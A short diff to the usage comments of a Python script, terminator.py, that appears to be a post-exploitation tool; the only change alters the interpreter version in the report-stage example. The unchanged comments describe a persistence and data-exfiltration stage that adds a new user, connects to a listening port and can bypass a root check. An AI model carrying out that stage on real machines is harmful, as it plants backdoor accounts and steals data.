@@ -17,7 +17,7 @@
 #
 # usage: (stage 3-persistence/data exfiltration after gaining root privileges on target machine): python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))
 #
-# usage: (stage 4-create report on local machine): python3 terminator.py report -o <output_file_name>
+# usage: (stage 4-create report on local machine): python3.9 terminator.py report -o <output_file_name>
 
 
 import os
